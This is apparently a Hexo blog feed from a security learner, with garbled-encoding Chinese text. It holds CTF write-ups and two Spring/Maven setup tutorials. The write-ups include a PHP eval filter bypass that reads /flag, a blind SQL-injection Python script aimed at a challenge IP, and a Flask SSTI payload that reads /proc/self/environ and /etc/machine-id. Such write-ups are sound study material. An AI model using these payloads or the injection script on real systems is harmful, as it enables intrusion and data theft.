<figure class="highlight"><table><tr><td class="code"><pre><span class="line">User &#123;</span><br><span class="line">	name1 = 'mount4in1', name2 = 'mount4in2', name3 = 'mount4in3', name4 = 'mount4in4', age1 = 'a1', age2 = 'a2', age3 = 'a3', age4 = 'a4', prop1_1 = &#123;</span><br><span class="line">		prop1_1 = 1 _1</span><br><span class="line">	&#125;, prop1_2 = &#123;</span><br><span class="line">		prop1_2 = 1 _2</span><br><span class="line">	&#125;, prop1_3 = &#123;</span><br><span class="line">		prop1_3 = 1 _3</span><br><span class="line">	&#125;, prop1_4 = &#123;</span><br><span class="line">		prop1_4 = 1 _4</span><br><span class="line">	&#125;, prop2_1 = &#123;</span><br><span class="line">		prop2_1 = 2 _1</span><br><span class="line">	&#125;, prop2_2 = &#123;</span><br><span class="line">		prop2_2 = 2 _2</span><br><span class="line">	&#125;, prop2_3 = &#123;</span><br><span class="line">		prop2_3 = 2 _3</span><br><span class="line">	&#125;, prop2_4 = &#123;</span><br><span class="line">		prop2_4 = 2 _4</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1>]]></content>
      <tags>
        <tag>fastjson</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>2020å®‰æ’8æœˆæœˆèµ›å¤ç°</title>
    <url>/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>æœˆèµ›å¤ç°</p>
<a id="more"></a>

<h1 id="0x01-ezrce"><a href="#0x01-ezrce" class="headerlink" title="0x01 ezrce"></a>0x01 ezrce</h1><p>é¢˜ç›®ç»™äº†æºç ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$code=$_POST[<span class="string">'code'</span>];</span><br><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br><span class="line"><span class="comment">//This blacklist is so stupid.</span></span><br><span class="line">$blacklist = array_merge($_);</span><br><span class="line"><span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $code)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'you are not smart'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"echo($code)"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°é¢˜ç›®è¿‡æ»¤äº†å¤§å°å†™å­—æ¯ï¼Œæ•°å­—å’Œ<code>~</code>ã€<code>^</code>ã€<code>&amp;</code>ç­‰ç‰¹æ®Šç¬¦å·ï¼Œä½†æ˜¯æ²¡æœ‰è¿‡æ»¤<code>|</code>,åˆ©ç”¨|æ¥æ„é€ ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($de)</span></span>&#123;</span><br><span class="line">    $de = str_split($de);</span><br><span class="line">    $str = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($de <span class="keyword">as</span> $chr)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $chr;</span><br><span class="line">        $i = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span>($i&lt;<span class="number">255</span>)&#123;</span><br><span class="line">        <span class="comment">//echo urldecode("%".$i)|urldecode("%60");</span></span><br><span class="line">            <span class="keyword">if</span>((chr($i)|urldecode(<span class="string">"%60"</span>))==$chr)&#123;</span><br><span class="line">                <span class="keyword">echo</span> chr($i);</span><br><span class="line">                $str .= chr($i);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $i++;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode($str);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$de = <span class="string">"readfile"</span>;</span><br><span class="line">$de1 = <span class="string">"/flag"</span>;</span><br><span class="line">convert($de);</span><br><span class="line">convert($de1);</span><br><span class="line"><span class="comment">//EgUBBAYJDAU=</span></span><br><span class="line"><span class="comment">//BgwBBw==</span></span><br></pre></td></tr></table></figure>

<p>å°†baseè§£ç åï¼Œå‘é€</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">code&#x3D;(&#39;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#96;&#39;|&#39;	&#39;)(&#39;&#x2F;&#96;&#96;&#96;&#96;&#39;|&#39;&#x2F;&#39;));&#x2F;&#x2F;</span><br><span class="line">base64 Y29kZT0oJ2BgYGBgYGBgJ3wnEgUBBAYJDAUnKSgnL2BgYGAnfCcvBgwBBycpKTsvLw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906223220648.png" alt="image-20200906223220648"></p>
<h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>é¢˜ç›®ç»™äº†æºç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, redirect, request, session, abort, send_from_directory</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        blacklist = [<span class="string">'class'</span>, <span class="string">'attr'</span>, <span class="string">'mro'</span>, <span class="string">'base'</span>,</span><br><span class="line">                     <span class="string">'request'</span>, <span class="string">'session'</span>, <span class="string">'+'</span>, <span class="string">'add'</span>, <span class="string">'chr'</span>, <span class="string">'ord'</span>, <span class="string">'redirect'</span>, <span class="string">'url_for'</span>, <span class="string">'config'</span>, <span class="string">'builtins'</span>, <span class="string">'get_flashed_messages'</span>, <span class="string">'get'</span>, <span class="string">'subclasses'</span>, <span class="string">'form'</span>, <span class="string">'cookies'</span>, <span class="string">'headers'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'&#123;&#125;'</span>]</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">                flag = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> flag</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        <span class="keyword">return</span> open(__file__).read()</span><br><span class="line">    <span class="keyword">elif</span> safe_jinja(request.args.get(<span class="string">'name'</span>)):</span><br><span class="line">        name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        name = <span class="string">'wendell'</span></span><br><span class="line">    template = <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;div class="center-content"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Hello, %s&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;!--flag in /flag--&gt;</span></span><br><span class="line"><span class="string">    &lt;!--python3.8--&gt;</span></span><br><span class="line"><span class="string">'''</span> % (name)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å¼•å·ï¼Œå¸¸è§„çš„ç”¨requesä¹Ÿè¿‡æ»¤äº†ï¼Œ</p>
<h1 id="0x03-å®‰æ’å¤§å­¦"><a href="#0x03-å®‰æ’å¤§å­¦" class="headerlink" title="0x03 å®‰æ’å¤§å­¦"></a>0x03 å®‰æ’å¤§å­¦</h1><p>æ³¨å†Œçš„éªŒè¯é‚®ä»¶</p>
<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906224603906.png" alt="image-20200906224603906"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;183.129.189.60:10048&#x2F;doAction.php?act&#x3D;active&amp;username&#x3D;Mount4in&amp;token&#x3D;79e38f9896fbfd813240570a5a0de8de</span><br></pre></td></tr></table></figure>

<p>é€»è¾‘æ¡ä»¶ä¸åŒï¼Œå›æ˜¾ä¸åŒï¼Œ</p>
<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906225032634.png" alt="image-20200906225032634"></p>
<p><img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906225102323.png" alt="image-20200906225102323"></p>
<p>ç”¨è„šæœ¬ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://183.129.189.60:10048/doAction.php?"</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">  		<span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">		&#125;</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#erfenfa</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select group_concat(table_NAME) from information_schema.tableS where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select group_concat(column_NAME) from information_schema.columnS where table_schema=database() and table_name='teachers'),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select group_concat(f1aaaag) from teachers limit 1),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		payload = <span class="string">"act=active&amp;username=Mount4in' and ascii(mid((select f1aaaag from teachers  limit 11,1),&#123;&#125;,1))&gt;&#123;&#125;--+-&amp;token=79e38f9896fbfd813240570a5a0de8de"</span></span><br><span class="line">		url_1=url+payload.format(i,mid)</span><br><span class="line">		<span class="keyword">print</span> payload.format(i,mid)</span><br><span class="line">		r=requests.get(url_1,proxies=proxies)</span><br><span class="line">		<span class="comment">#print(r.content)</span></span><br><span class="line">		<span class="keyword">if</span> int(r.headers[<span class="string">'content-length'</span>]) &lt; <span class="number">100</span>:</span><br><span class="line">			low=mid+<span class="number">1</span> </span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			high=mid</span><br><span class="line">		mid=(low+high)//<span class="number">2</span></span><br><span class="line">	flag+=chr(mid)</span><br><span class="line">	print(flag) </span><br><span class="line"><span class="comment"># table student,teachers,users</span></span><br><span class="line"><span class="comment"># teachers: id,f1aaaag</span></span><br></pre></td></tr></table></figure>

<img src="/2020/09/06/2020%E5%AE%89%E6%81%928%E6%9C%88%E6%9C%88%E8%B5%9B%E5%A4%8D%E7%8E%B0/image-20200906232104192.png" alt="image-20200906232104192" style="zoom:150%;">

<p>å‚è€ƒ</p>
<p><a href="https://www.gem-love.com/" target="_blank" rel="noopener">https://www.gem-love.com/</a></p>
<p><a href="https://rce.moe/" target="_blank" rel="noopener">https://rce.moe/</a>****</p>
]]></content>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>ç”¨ideaå’Œmavenç¼–å†™spring booté¡¹ç›®</title>
    <url>/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>è®°å½•ä¸‹ç”¨ideaæ–°å»ºSpring booté¡¹ç›®</p>
<a id="more"></a>

<p>1ã€New Project</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124035963.png" alt="image-20200903124035963"></p>
<p>2ã€Settings</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124114739.png" alt="image-20200903124114739"></p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124134588.png" alt="image-20200903124134588"></p>
<p>3ã€é…ç½®maven</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124241455.png" alt="image-20200903124241455"></p>
<p>4ã€æ·»åŠ æ§åˆ¶å™¨</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124524743.png" alt="image-20200903124524743"></p>
<p>5ã€è¿è¡Œã€‚</p>
<p><img src="/2020/09/03/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring-boot%E9%A1%B9%E7%9B%AE/image-20200903124624017.png" alt="image-20200903124624017"></p>
]]></content>
  </entry>
  <entry>
    <title>2020GACTFé¢˜ç›®å¤ç°</title>
    <url>/2020/09/02/2020GACTF%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>æ²¡æ‰“æ¯”èµ›ï¼Œèµ›åå¤ç°</p>
<a id="more"></a>

<h1 id="0X01-Babyshop"><a href="#0X01-Babyshop" class="headerlink" title="0X01 Babyshop"></a>0X01 Babyshop</h1><h1 id="0x02-SimpleFlask"><a href="#0x02-SimpleFlask" class="headerlink" title="0x02 SimpleFlask"></a>0x02 SimpleFlask</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&#123;&#123;&quot;&quot;.__class__.__base__.__subclasses__()[177].__init__.__globals__.__builtins__[&quot;open&quot;](&quot;&#x2F;proc&#x2F;self&#x2F;environ&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello HOSTNAME&#x3D;79a0b2aa07d3HOME&#x3D;&#x2F;rootPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binDEBIAN_FRONTEND&#x3D;noninteractivePWD&#x3D;&#x2F;home&#x2F;ctfLC_CTYPE&#x3D;C.UTF-8WERKZEUG_SERVER_FD&#x3D;3WERKZEUG_RUN_MAIN&#x3D;true!</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hello 02:42:ac:15:00:06 !</span><br><span class="line">2485378154502</span><br><span class="line">&#x2F;etc&#x2F;machine-id</span><br><span class="line">hello a8eb6cac33e701ae867269db5ce80e7f !</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.7&#x2F;dist-packages&#x2F;flask&#x2F;app.py&quot;</span><br></pre></td></tr></table></figure>

<p><a href="https://mp.weixin.qq.com/s/0cOsuIFJwHbHIYvluQq4WQ" target="_blank" rel="noopener">GACTF Writeup Byæ˜Ÿç›Ÿå®‰å…¨å›¢é˜Ÿ</a></p>
]]></content>
  </entry>
  <entry>
    <title>ç”¨ideaå’Œmavenç¼–å†™springé¡¹ç›®</title>
    <url>/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>è®°å½•ä¸‹ç”¨ideaæ–°å»ºSpringé¡¹ç›®</p>
<a id="more"></a>

<h1 id="0x01-ç¯å¢ƒé…ç½®"><a href="#0x01-ç¯å¢ƒé…ç½®" class="headerlink" title="0x01 ç¯å¢ƒé…ç½®"></a>0x01 ç¯å¢ƒé…ç½®</h1><ul>
<li>Jdk</li>
<li>Tomcat</li>
<li>maven</li>
</ul>
<h1 id="0x02-ç®€å•çš„hello-world"><a href="#0x02-ç®€å•çš„hello-world" class="headerlink" title="0x02 ç®€å•çš„hello world"></a>0x02 ç®€å•çš„hello world</h1><p>æ–°å»ºä¸€ä¸ªé¡¹ç›®</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122008994.png" alt="image-20200831122008994"></p>
<p>ç»™é¡¹ç›®å‘½å</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122050164.png" alt="image-20200831122050164"></p>
<p>é€‰æ‹©mavenï¼Œè¿™é‡Œsettings.xmlå¿…é¡»è¦å’Œrepositoryåœ¨åŒä¸€ä¸ªç›®å½•ï¼Œå¦åˆ™ä¼šå‡ºé”™ï¼Œsetting.xmlå¯ä»¥æ·»åŠ é˜¿é‡Œäº‘çš„ä»“åº“</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">"http://maven.apache.org/SETTINGS/1.0.0"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd"</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">pluginGroups</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">proxies</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servers</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- mavenè‡ªåŠ¨ä¸‹è½½çš„jaråŒ…ï¼Œä¼šå­˜æ”¾åˆ°è¯¥ç›®å½•ä¸‹ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>C:\Users\admin\software\Maven\repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span>    </span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/repositories/central/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>alimaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>aliyun maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.aliyun.com/nexus/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>central<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Maven Repository Switchboard<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo1.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>repo2<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repo2.maven.org/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>ibiblio<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Human Readable Name for this Mirror.<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://mirrors.ibiblio.org/pub/mirrors/maven2/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>jboss-public-repository-group<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>JBoss Public Repository Group<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://repository.jboss.org/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>google-maven-central<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Maven Central<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven-central.storage.googleapis.com</span><br><span class="line">            <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ä¸­å¤®ä»“åº“åœ¨ä¸­å›½çš„é•œåƒ --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>maven.net.cn<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>oneof the central mirrors in china<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.net.cn/content/groups/public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">settings</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122335109.png" alt="image-20200831122335109"></p>
<p>æ–°å»ºå®Œé¡¹ç›®çš„ç›®å½•ç»“æ„æ˜¯è¿™æ ·çš„</p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122421222.png" alt="image-20200831122421222" style="zoom:150%;">

<p>ç„¶åæ·»åŠ javaå’Œresourcesæ–‡ä»¶å¤¹</p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831122542181.png" alt="image-20200831122542181" style="zoom:150%;">

<p>é…ç½®Tomcatï¼Œ</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831123907239.png" alt="image-20200831123907239"></p>
